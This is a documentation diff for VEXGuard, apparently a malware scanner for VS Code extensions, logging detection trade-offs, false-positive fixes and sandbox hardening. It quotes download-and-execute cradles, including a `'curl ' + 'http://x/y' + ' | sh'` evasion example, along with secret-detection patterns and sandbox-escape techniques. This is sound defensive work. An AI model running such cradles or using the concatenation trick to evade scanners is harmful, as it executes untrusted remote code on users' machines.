@@ -649,3 +649,248 @@ analysis was cut short rather than completed.
 * **`acorn` is effectively required.** Without it the static stage falls back to
   regex matching — the false-positive-prone mode v3 exists to leave behind. The
   launchers warn loudly when it is missing.
+* **A legitimate self-installing CLI shim is structurally identical to a
+  download-and-execute cradle, and this is left unfixed on purpose.**
+  Found 2026-08-12 auditing a false positive on `GitHub.copilot-chat@0.48.1`:
+  `dist/copilotCLIShim.js` genuinely calls
+  `spawnSync("bash", ["-c", "curl -fsSL https://gh.io/copilot-install | bash"], ...)`
+  as a fallback installer (after trying `brew` first) — this is not a
+  matching bug, the code really does fetch and execute a remote script, which
+  is exactly what the cradle rule (`preprocess.js`, `isCradleLiteral`) is
+  designed to catch. The only difference from a malicious dropper is that
+  `gh.io` is GitHub's own domain. Two fixes were considered and rejected:
+  - **Allowlist known vendor install domains** (`gh.io`, `sh.rustup.rs`,
+    `get.docker.com`, ...) — rejected because domain allowlisting is a real
+    evasion surface: attackers routinely stage payloads on trusted
+    infrastructure precisely to defeat this kind of check (e.g.
+    `raw.githubusercontent.com` is one of the most common real-world dropper
+    hosts, and would either have to be excluded case-by-case forever or
+    included and immediately be a hole).
+  - **Downgrade the cradle finding from primary to supporting tier** — also
+    rejected: it would equally weaken recall against real malware samples
+    that use this exact single-technique cradle with no other corroborating
+    signal, which is a common real pattern in the corpus (see `docs/03-TEST-RESULTS.md`).
+
+  Decision: leave the rule as-is. A legitimate extension that self-installs
+  a CLI via `curl | bash` (a widespread, if debatable, industry pattern —
+  rustup, nvm, Homebrew, and now GitHub's own Copilot CLI all use it) will
+  be flagged MALICIOUS by VEXGuard. This is an accepted, documented
+  trade-off in favor of not opening a domain-based bypass, not an oversight.
+
+---
+
+## 13. 2026-08-12 — cradle-rule proximity fix + corpus expansion
+
+Re-ran the full pipeline against a larger, independently-sourced corpus
+(138 malicious samples — the original DataDog set plus 16 additional
+samples from `trailofbits/vsix-zoo`; 100 benign samples pulled fresh from
+the VS Code Marketplace's own gallery API sorted by real install count,
+replacing the earlier hand-picked benign list). This surfaced one more
+confirmed bug, distinct from the `curl|bash` trade-off in §12/§11 above and
+**not caused by it or by the concat-folding fix in §12** — traced to the
+exact same AST node type (a single `Literal`, not a folded
+`BinaryExpression`) that existed before any of that work:
+
+* **`isCradleLiteral()` had no proximity requirement between its three
+  signals.** `ms-dotnettools.vscode-dotnet-runtime@3.1.0` embeds its own
+  `package.json` as a single 1,964-character string literal. That JSON
+  blob's `scripts` section legitimately contains `"...&& @powershell..."`
+  and `"...&& sh ./mock-webpack.sh..."` entries (ordinary cross-platform
+  build scripts), and the same blob's `repository.url` field is an
+  `https://` URL — three substrings that individually satisfied
+  `LOLBIN_RE`/`EXEC_CHAIN_RE`/`PAYLOAD_RE` with zero relationship to each
+  other, purely by coincidence of JSON structure. The three checks were
+  each `.test()`ed against the whole (up to 4,000-char) string independently.
+  Fixed in two layers:
+  1. All three signals must now co-occur within one 300-character sliding
+     window (`CRADLE_WINDOW`), scanned across the literal — a real
+     `curl … | bash` one-liner is always far smaller than this (the two
+     genuine cradles found in this same audit pass, from §12's `curl|bash`
+     entry, are 44 characters each).
+  2. The window alone wasn't sufficient for this specific case — a
+     `package.json` `scripts` block packs several shell-invoking entries
+     within a couple hundred characters of a URL field, so the three
+     signals could still cluster by coincidence. Added a more targeted
+     check: a literal that parses as valid JSON is skipped outright, since
+     a real download-and-execute cradle is a plain command string handed to
+     `exec`/`spawn`, never a JSON blob.
+  Verified: the FP is gone; all four cradle-shaped test cases (plain
+  single-literal cradle, `'+'`-concatenated cradle from §12, the two
+  accepted `curl|bash`/`irm|iex` installer literals, and an adversarial
+  "JSON-prefixed-but-invalid-JSON" cradle string) still correctly flag.
+  `--selftest` still passes.
+
+**Updated headline numbers on this expanded corpus (STRICT / n=238, after
+the fix above):** TP=55, FP≈11 (down from 12 pre-fix), FN=83, TN≈89 — see
+`vexguard-results/METRICS.md` for the exact re-run figures. As with §12,
+none of this has been checked against the `analysis/holdout_ids.json`
+partition, and the corpus itself is a *different* (larger, independently
+re-sourced) sample set from the one `docs/03-TEST-RESULTS.md`'s headline
+numbers were measured on — these figures are not directly comparable to
+that document without accounting for both differences.
+
+---
+
+## 12. 2026-08-11 audit-driven bug fixes (not yet a version bump)
+
+A two-round internal audit (containment/safety review, docs-vs-code drift
+check, static/taint logic review, mock-vscode/benchmark logic review) found
+and fixed the defects below. Every fix was verified — `--selftest` after
+every file's change, plus dedicated synthetic escape-attempt / positive-
+control fixtures for every containment and detection-fidelity fix (see
+verification notes per item). **None of this was re-validated against the
+real DataDog/VsMex corpora** (not available on the machine that did this
+pass) — per `docs/EVALUATION-METHODOLOGY.md`, the headline numbers in
+`docs/03-TEST-RESULTS.md` / `vexguard-results/METRICS.md` remain the
+last real measurement until `benchmark.js` is re-run, and any recall/
+precision change from these fixes should be checked against the frozen
+holdout partition before being cited as an improvement.
+
+### 12.1 Metrics integrity
+
+* **`benchmark.js` `matrix()` counted analysis errors as real misses.**
+  Rows with `final_verdict === 'ERROR'` were folded into FN (if label=1) or
+  TN (if label=0) instead of being excluded, corrupting every derived metric.
+  Did not affect the published `metrics.json` (all sections report
+  `errors: 0` in the last real run) but was a live bug for any future run
+  with errors. Fixed to `continue` past error rows; error count now also
+  shown inline in `METRICS.md`, not just the JSON.
+* **`benchmark.js` label coercion** — `Number('')` is `0`, not `NaN`, so an
+  empty/malformed `label` field could silently be admitted as a real benign
+  label. Guard now checks the raw string first.
+* **`benchmark.js` `diagnoseFP` misattribution** — a single `/exfiltrat/i`
+  test matched five structurally distinct rules (taint-confirmed rule, host-
+  fingerprint rule, chat-webhook rule, Telegram rule, tunnel-endpoint rule),
+  all routed to `TAINT_OVERMATCH` with a `data-intel.js` fix pointer that's
+  only correct for the first. Split into five rule-specific checks, each with
+  its own cause code and correct fix pointer.
+
+### 12.2 Detection-evasion fix (static layer)
+
+* **Cradle detector defeated by string concatenation.** `preprocess.js`'s
+  literal-scoped download-and-execute cradle check (`isCradleLiteral`) tests
+  each AST string literal independently; `'curl ' + 'http://x/y' + ' | sh'`
+  was three fragments, none of which alone looked like a cradle — live-
+  verified to drop a 55-point primary finding to 12 points (below the
+  MALICIOUS bar), on both the AST path and the regex fallback used for
+  unparseable files. Fixed by folding statically-foldable `'+'` concatenation
+  chains (AST) and joining adjacent quoted-literal runs connected only by
+  `+` (regex fallback) before testing.
+* **Recon-battery rule double-counted across files** — its `once()` dedup
+  key embedded live hit-counts, so the same capability was scored once per
+  file instead of once per extension. Dedup key is now fixed text; counts
+  moved to the `detail` field.
+* **`.ts`/`.tsx` never reached the AST layer** (`JS_EXT` only matched
+  `.js/.cjs/.mjs`) — extended to include them. Acorn still can't parse
+  TS-only syntax, so this only gains coverage for the subset of `.ts`/`.tsx`
+  files that happen to be plain-JS-compatible; the existing graceful
+  parse-failure fallback (confirmed non-silent) covers the rest exactly as
+  before.
+
+### 12.3 Secret/taint rule fixes (`data-intel.js`)
+
+* **`dotenv_secrets` missed most real-world compound variable names**
+  (`CLIENT_SECRET`, `STRIPE_SECRET_KEY`, `JWT_SECRET`, `DATABASE_PASSWORD`,
+  `AUTH_TOKEN`, ...) because `\bSECRET\b`-style boundaries don't separate
+  `_`-joined words. Regex now matches the keyword anywhere within an
+  underscore/hyphen-delimited identifier.
+* **`crypto_wallet` false-positive risk** — a bare `\b[0-9a-fA-F]{64}\b`
+  alternative matched any SHA-256-shaped hex string (Docker digests, npm
+  integrity hashes, HMAC signatures) with no path gating. Now requires a
+  private/secret-key label immediately before the hex value.
+* **`aws_credentials` only matched the `AKIA` prefix** — extended to
+  `ASIA`/`AGPA`/`AIDA`/`AROA`/`ANPA`/`ANVA`.
+* **`decodeLayers()` was one layer deep, no decompression** — a
+  gzip/inflate/brotli-compressed secret, or a doubly-base64-encoded one,
+  never reached the taint/content matchers. Added `zlib` decompression
+  attempts and bounded recursive re-decoding (max 3 levels, 40 candidates)
+  so the "CONFIRMED exfiltration" claim now also holds for these transforms,
+  not just single-layer base64/hex/URL encoding.
+
+### 12.4 Detonation-fidelity fixes (`mock-vscode.js` / `sandbox.js`)
+
+* **`vscode.tasks.onDidStartTask`/`onDidEndTask` were wired to brand-new,
+  disconnected emitters** — task-gated payloads never activated, while the
+  simulation log claimed "27/27 fired." Now reference the same emitters
+  `sandbox.js` actually fires.
+* **`context.secrets`/`context.workspaceState` were never pre-seeded** —
+  only `globalState` was, so a payload gated on either of the other two
+  silently took its benign branch. `sandbox.js`'s context-seeding block now
+  mirrors the same gate-opening keys into both.
+* **Materially larger unreachable event surface** beyond the two items
+  above — `workspace.onWill*Files`, notebook events, debug session events,
+  `tabGroups`, `env` telemetry/log-level/shell-change, and
+  `lm`/`notebooks` events were all left as disconnected anonymous emitters,
+  contradicting the file's own "exhaustive" claim. Wired into the shared
+  named-emitter registry and added to `sandbox.js`'s fired `SEQUENCE`
+  (27 → 49 events fired per run). Two context-scoped emitters
+  (`context.secrets.onDidChange`, `context.languageModelAccessInformation.onDidChange`)
+  remain unwired — documented in `mock-vscode.js` rather than silently
+  re-claimed as solved.
+* **Verified**: a fixture registering listeners on the previously-dead task
+  event, `context.secrets`, and `context.workspaceState` gates now shows all
+  three firing (plus the pre-existing `globalState` gate), via distinct
+  outbound network markers — confirmed with a live run, not just code
+  reading.
+
+### 12.5 Sandbox containment hardening
+
+The dynamic-detonation subprocess (`sandbox.js`, spawned once per sample by
+`VEXGuard.js` — this process boundary already existed) had several gaps
+*inside* that process where a sufficiently deliberate payload could reach
+real disk/network/native-code, contradicting README §A.8's containment
+claims. All were closed and verified with a live adversarial fixture
+(prototype-pollution attempt, five different real-file-write attempts,
+`dns.resolveTxt`/`tls.connect`/`dgram.send`/`http2.connect`,
+`new Function()` + `process.mainModule` realm-escape attempts) — every
+attempt is now logged/blocked instead of reaching the real OS resource; the
+fixture's on-disk canary files confirmed zero real writes occurred.
+
+* **`fs.promises`, `fs.WriteStream`, low-level `open`+`write(Sync)`, and
+  nested `require('fs/promises')` all reached the real filesystem** — the
+  `Object.assign({}, realFs, {...})` pattern inherited every unoverridden
+  real export, including `.promises` and the `WriteStream` class. Rebuilt
+  `fs.promises` as its own hardened object (shared with the
+  `require('fs/promises')` intercept), added an `open`/`openSync` wrapper
+  that only allows genuinely read-only opens through to the real fs (write/
+  append/create/truncate intent gets a fake fd), and replaced `WriteStream`
+  with a real class (`FakeWriteStream`) so both the factory function and
+  `new fs.WriteStream(...)` are contained identically.
+* **`dns.resolveTxt`/`resolveMx`/`resolveSrv`/`resolveCname`/`resolveNs`/
+  `resolveSoa`/`resolvePtr`/`resolveNaptr`/`reverse`, and `tls`/`dgram`/
+  `http2` entirely, were unhooked** — real DNS queries and raw TLS/UDP/
+  HTTP2 traffic could leave the host. Added the missing DNS resolver
+  overrides and three new fail-closed hook modules (`createTlsHook`,
+  `createDgramHook`, `createHttp2Hook`, following the existing
+  `child_process` hook's pattern of a plain object rather than
+  `Object.assign` over the real module) wired into both `interceptMap` and
+  `patchRequireCache` (the latter now also covers the `node:`-prefixed form
+  of every hooked core module, previously only the bare form was covered).
+* **Host intrinsics (`Object`/`Array`/`Function`/...) aliased directly into
+  the vm context enabled prototype pollution reaching the sandbox process's
+  real prototypes**, and `new Function(...)` was proxied to the host's real
+  `Function` constructor, executing the compiled body in the host V8 realm
+  instead of the instrumented vm context. Fixed by (a) freezing
+  `Object`/`Array`/`Function`/`String`/`Number`/`Boolean`/`RegExp`/`Error`/
+  `Promise`/`Map`/`Set` prototypes once per detonation process — this
+  preserves every `instanceof`/type-check relationship the vm-intrinsics
+  aliasing exists for, while making any write to the prototype a silent
+  no-op instead of a real mutation, and (b) changing the `Function` proxy's
+  `construct` trap to compile and run via `vm.runInContext()` against the
+  same context, exactly mirroring how `eval()` was already handled.
+* **The raw `process` object exposed `process.mainModule.require`** (a
+  require path that bypasses every hook above) **and
+  `process.binding`/`_linkedBinding`/`dlopen`** (native-addon loading,
+  fully outside JS-level mediation). Replaced with a `Proxy` that denies
+  exactly those properties; everything else on `process` is unchanged.
+* **Decoy-profile cleanup wasn't guaranteed on every exit path** — only
+  called from four explicit return points, not a blanket `try`/`finally`,
+  so an uncaught mid-run exception could leave the (harmless, inert) decoy
+  directory on disk. Now wrapped in `try { ... } finally { restoreEnv(); }`
+  around the whole detonation body.
+
+README §A.8 / §B.8 updated to describe the hardened state accurately,
+including an explicit statement that this is JS-level containment in a
+single instrumented child process, not OS-level sandboxing — true privilege
+restriction (a container, VM, or restricted-privilege OS account) remains
+future work, tracked in `docs/EVALUATION-METHODOLOGY.md`.
